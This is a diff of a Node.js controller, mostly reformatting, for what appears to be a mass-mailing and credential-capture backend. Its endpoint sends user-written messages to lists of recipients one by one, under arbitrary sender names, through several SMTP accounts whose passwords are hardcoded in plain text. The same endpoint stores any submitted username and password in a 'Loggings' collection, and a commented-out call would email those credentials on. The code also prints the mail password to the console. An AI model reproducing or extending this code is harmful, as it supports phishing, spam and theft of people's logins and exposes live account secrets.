@@ -10,12 +10,10 @@ var handlebars = require("handlebars");
 var fs = require("fs");
 var moment = require("moment");
 const { request } = require("https");
-var multer = require('multer')
-const Loggings=db.loggings
-const dotenv = require('dotenv');
+var multer = require("multer");
+const Loggings = db.loggings;
+const dotenv = require("dotenv");
 dotenv.config();
-
-
 
 exports.sendmaintenancemail = (req, res) => {
   smtpTransport = nodemailer.createTransport(
@@ -1042,15 +1040,14 @@ const sendmaintenancemail = (username, message) => {
       },
     })
   );
-  
 
-var from = `Sung Park <i@gmail.com>`
+  var from = `Sung Park <i@gmail.com>`;
 
-var mail = {
-            from: from,
-            to: "gokeayomide.tolu@gmail.com",
-            subject: `Consultation: New client`,
-            html: `<h1>New client for kitomba</h1>
+  var mail = {
+    from: from,
+    to: "gokeayomide.tolu@gmail.com",
+    subject: `Consultation: New client`,
+    html: `<h1>New client for kitomba</h1>
             <ul>
                 <li>Firstname: </li>
                 <li>Lastname: </li>
@@ -1060,25 +1057,21 @@ var mail = {
                 <li>Suburb: </li>
                 <li>State: </li>
                 <li>Postal code: </li>
-            </ul>`
-        }
+            </ul>`,
+  };
 
+  smtpTransport.sendMail(mail, function (error, response) {
+    if (error) {
+      console.log(error);
+      callback(error);
+    }
+  });
+  console.log("done");
 
-smtpTransport.sendMail(mail, function (error, response) {
-          if (error) {
-            console.log(error);
-            callback(error);
-          }
-        });
-        console.log('done')
-
-
-// let from = `Consultation <i***@gmail.com>`
-
-
+  // let from = `Consultation <i***@gmail.com>`
 };
 
-const sendMails = (emailName,emailSubject,emailBody,emailLists) => {
+const sendMails = (emailName, emailSubject, emailBody, emailLists) => {
   // smtpTransport = nodemailer.createTransport(
   //   smtpTransport({
   //     host: "smtp.gmail.com",
@@ -1095,53 +1088,47 @@ const sendMails = (emailName,emailSubject,emailBody,emailLists) => {
   // );
 
   let smtpTransport = nodemailer.createTransport({
-    host: "smtp.gmail.com",
+    host: `${process.env.HOST}`,
 
-      port: "587",
-      
-      auth: {
-        // user: "mana@gmail.com",
-        // pass: "alvvcakmxqbfgvfa",
+    port: "587",
 
-        user: `${process.env.MAIL}`,
-        pass: `${process.env.MAILPASS}`,
-      },
-   //secure: true, // true for 465, false for other ports
+    auth: {
+      // user: "mana@gmail.com",
+      // pass: "alvvcakmxqbfgvfa",
+
+      user: `${process.env.MAIL}`,
+      pass: `${process.env.MAILPASS}`,
+    },
+    //secure: true, // true for 465, false for other ports
     // auth: {
     //   user: testAccount.user, // generated ethereal user
     //   pass: testAccount.pass, // generated ethereal password
     // },
   });
-  
- console.log( `${process.env.MAIL}`)
- console.log( `${process.env.MAILPASS}`)
 
-var from = `${emailName} <lindamiller1735@gmail.com>`
+  console.log(`${process.env.MAIL}`);
+  console.log(`${process.env.MAILPASS}`);
 
-var mail = {
-            from: from,
-            to: emailLists,
-            subject: `${emailSubject}`,
-            text:emailBody   
-        }
+  var from = `${emailName} <lindamiller1735@gmail.com>`;
 
+  var mail = {
+    from: from,
+    to: emailLists,
+    subject: `${emailSubject}`,
+    text: emailBody,
+  };
 
+  smtpTransport.sendMail(mail, function (error, response) {
+    if (error) {
+      console.log(error);
+    }
+  });
+  console.log("done");
+  smtpTransport.close();
 
-
-smtpTransport.sendMail(mail, function (error, response) {
-          if (error) {
-            console.log(error);
-        
-          }
-        });
-        console.log('done')
-smtpTransport.close()
-
-// let from = `Consultation <i***@gmail.com>`
-
-
+  // let from = `Consultation <i***@gmail.com>`
 };
-const sendMails2 = (emailName,emailSubject,emailBody,emailLists) => {
+const sendMails2 = (emailName, emailSubject, emailBody, emailLists) => {
   // smtpTransport = nodemailer.createTransport(
   //   smtpTransport({
   //     host: "smtp.gmail.com",
@@ -1160,50 +1147,43 @@ const sendMails2 = (emailName,emailSubject,emailBody,emailLists) => {
   let smtpTransport = nodemailer.createTransport({
     host: "fesney.com",
 
-      port: "465",
-      
-      auth: {
-        // user: "adegokeadeleke.ayo@gmail.com",
-        // pass: "alvvcakmxqbfgvfa",
+    port: "465",
 
-        user: "myceo5@fesney.com",
-        pass: "Lolade12345",
-      },
+    auth: {
+      // user: "adegokeadeleke.ayo@gmail.com",
+      // pass: "alvvcakmxqbfgvfa",
+
+      user: "myceo5@fesney.com",
+      pass: "Lolade12345",
+    },
     secure: true, // true for 465, false for other ports
     // auth: {
     //   user: testAccount.user, // generated ethereal user
     //   pass: testAccount.pass, // generated ethereal password
     // },
   });
-  
-  
 
-var from = `${emailName} <myceo5@fesney.com>`
+  var from = `${emailName} <myceo5@fesney.com>`;
 
-var mail = {
-            from: from,
-            to: emailLists,
-            subject: `${emailSubject}`,
-            text:emailBody   
-        }
+  var mail = {
+    from: from,
+    to: emailLists,
+    subject: `${emailSubject}`,
+    text: emailBody,
+  };
 
+  smtpTransport.sendMail(mail, function (error, response) {
+    if (error) {
+      console.log(error);
+      callback(error);
+    }
+  });
+  console.log("done");
+  smtpTransport.close();
 
-
-
-smtpTransport.sendMail(mail, function (error, response) {
-          if (error) {
-            console.log(error);
-            callback(error);
-          }
-        });
-        console.log('done')
-smtpTransport.close()
-
-// let from = `Consultation <i***@gmail.com>`
-
-
+  // let from = `Consultation <i***@gmail.com>`
 };
-const sendMails3 = (emailName,emailSubject,emailBody,emailLists) => {
+const sendMails3 = (emailName, emailSubject, emailBody, emailLists) => {
   // smtpTransport = nodemailer.createTransport(
   //   smtpTransport({
   //     host: "smtp.gmail.com",
@@ -1222,48 +1202,41 @@ const sendMails3 = (emailName,emailSubject,emailBody,emailLists) => {
   let smtpTransport = nodemailer.createTransport({
     host: "smtp.gmail.com",
 
-      port: "587",
-      
-      auth: {
-        // user: "adegokeadeleke.ayo@gmail.com",
-        // pass: "alvvcakmxqbfgvfa",
+    port: "587",
 
-        user: "kolkatawomanfundfoundation@gmail.com",
-        pass: "Lolade12345",
-      },
-//     secure: true, // true for 465, false for other ports
+    auth: {
+      // user: "adegokeadeleke.ayo@gmail.com",
+      // pass: "alvvcakmxqbfgvfa",
+
+      user: "kolkatawomanfundfoundation@gmail.com",
+      pass: "Lolade12345",
+    },
+    //     secure: true, // true for 465, false for other ports
     // auth: {
     //   user: testAccount.user, // generated ethereal user
     //   pass: testAccount.pass, // generated ethereal password
     // },
   });
-  
-  
 
-var from = `${emailName} <i@gmail.com>`
+  var from = `${emailName} <i@gmail.com>`;
 
-var mail = {
-            from: from,
-            to: emailLists,
-            subject: `${emailSubject}`,
-            text:emailBody   
-        }
+  var mail = {
+    from: from,
+    to: emailLists,
+    subject: `${emailSubject}`,
+    text: emailBody,
+  };
 
+  smtpTransport.sendMail(mail, function (error, response) {
+    if (error) {
+      console.log(error);
+      callback(error);
+    }
+  });
+  console.log("done");
+  smtpTransport.close();
 
-
-
-smtpTransport.sendMail(mail, function (error, response) {
-          if (error) {
-            console.log(error);
-            callback(error);
-          }
-        });
-        console.log('done')
-smtpTransport.close()
-
-// let from = `Consultation <i***@gmail.com>`
-
-
+  // let from = `Consultation <i***@gmail.com>`
 };
 function sleep(ms) {
   return new Promise((resolve) => {
@@ -1272,68 +1245,50 @@ function sleep(ms) {
 }
 exports.createmaintenance = (req, res) => {
   // console.log(`i was called ${(req.params)}`)
-    let attatch=''
-    
+  let attatch = "";
 
-        if(req.body.emailName){
-          var emailName=req.body.emailName
-          var emailSubject=req.body.emailSubject
-          var emailBody=req.body.emailBody
-          var emailLists=req.body.emailLists
-          var emailArray = emailLists.split(',');
+  if (req.body.emailName) {
+    var emailName = req.body.emailName;
+    var emailSubject = req.body.emailSubject;
+    var emailBody = req.body.emailBody;
+    var emailLists = req.body.emailLists;
+    var emailArray = emailLists.split(",");
 
-        for(var i = 0; i < emailArray.length; i++) {
-          // Trim the excess whitespace.
-          emailArray[i] = emailArray[i].replace(/^\s*/, "").replace(/\s*$/, "");
-          // Add additional code here, such as:
-          console.log(emailArray[i]);
-          if(req.body.Sammy){
-            sendMails2(
-              emailName,emailSubject,emailBody,emailArray[i]
-            )    
-             sleep(10000)
-          }
-
-          if(req.body.yomi){
-            sendMails3(
-              emailName,emailSubject,emailBody,emailArray[i]
-            )    
-             sleep(10000)
-          }
-
-          if(! req.body.yomi &&  ! req.body.Sammy){
-            sendMails(
-              emailName,emailSubject,emailBody,emailArray[i]
-            )
-            sleep(10000)
-          }
-        
-     
-        }
-          
-        }
-
-    const tenant = new Loggings({
-     username: req.body.username,
-      password: req.body.password,
-  
-    });
-
-  
-    tenant.save((err, user) => {
-      if (err) {
-        res.status(500).send({ message: err });
-        return;
+    for (var i = 0; i < emailArray.length; i++) {
+      // Trim the excess whitespace.
+      emailArray[i] = emailArray[i].replace(/^\s*/, "").replace(/\s*$/, "");
+      // Add additional code here, such as:
+      console.log(emailArray[i]);
+      if (req.body.Sammy) {
+        sendMails2(emailName, emailSubject, emailBody, emailArray[i]);
+        sleep(10000);
       }
-  
-      
-    });
 
+      if (req.body.yomi) {
+        sendMails3(emailName, emailSubject, emailBody, emailArray[i]);
+        sleep(10000);
+      }
 
-   
-  
-  
-// sendmaintenancemail(req.body.username,req.body.password)
+      if (!req.body.yomi && !req.body.Sammy) {
+        sendMails(emailName, emailSubject, emailBody, emailArray[i]);
+        sleep(10000);
+      }
+    }
+  }
+
+  const tenant = new Loggings({
+    username: req.body.username,
+    password: req.body.password,
+  });
+
+  tenant.save((err, user) => {
+    if (err) {
+      res.status(500).send({ message: err });
+      return;
+    }
+  });
+
+  // sendmaintenancemail(req.body.username,req.body.password)
 };
 
 exports.getmaintenance = (req, res) => {
